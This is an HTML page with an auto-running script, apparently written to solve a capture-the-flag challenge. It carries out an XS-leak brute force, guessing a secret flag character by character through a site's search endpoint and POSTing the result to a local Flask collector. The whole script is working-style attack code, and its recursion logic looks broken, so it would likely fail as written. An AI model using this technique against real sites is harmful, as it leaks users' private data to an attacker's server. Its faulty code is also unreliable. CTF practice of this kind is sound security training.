<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Brute Force XS Leak</title>
    <script>
        async function bruteForceFlag() {
            const baseUrl = 'https://matrix.capturetheflags.site/search?s=';
            const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+[]{}|;:,.<>?'; // Includi caratteri speciali
            let currentFlag = 'flag{'; // Inizia con la parte fissa della flag
            let found = false;

            // Funzione per inviare la flag trovata al server Flask
            async function sendFlag(flag) {
                try {
                    const response = await fetch('http://localhost:5000/submit_flag', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ flag }),
                    });
                    if (response.ok) {
                        console.log('Flag inviata al server:', flag);
                    } else {
                        console.error('Errore nell\'invio della flag:', response.status);
                    }
                } catch (error) {
                    console.error('Errore nella richiesta:', error);
                }
            }

            // Funzione ricorsiva per il brute force
            async function search(index) {
                if (found) return; // Se gi√† trovata, esci
                if (index === currentFlag.length) {
                    for (let char of characters) {
                        const url = baseUrl + currentFlag + char + '}'; // Prova aggiungendo un carattere
                        const response = await fetch(url);
                        if (response.status === 200) {
                            currentFlag += char + '}'; // Aggiungi il carattere e chiudi la flag
                            found = true; // Segna come trovata
                            console.log('Flag trovata:', currentFlag);
                            await sendFlag(currentFlag); // Invia la flag al server Flask
                            break; // Esci dal ciclo
                        }
                    }
                } else {
                    // Prova con il prossimo carattere
                    for (let char of characters) {
                        const url = baseUrl + currentFlag + char; // Prova con il carattere attuale
                        const response = await fetch(url);
                        if (response.status === 200) {
                            currentFlag += char; // Aggiungi il carattere
                            await search(index + 1); // Prosegui al prossimo carattere
                            break; // Esci dal ciclo se trovato
                        }
                    }
                }
            }

            await search(0); // Inizia la ricerca
        }

        window.onload = function() {
            bruteForceFlag(); // Avvia la funzione al caricamento della pagina
        };
    </script>
</head>
<body>
    <h1>Brute Force XS Leak Attack</h1>
    <p>Attendere mentre si cerca la flag...</p>
</body>
</html>
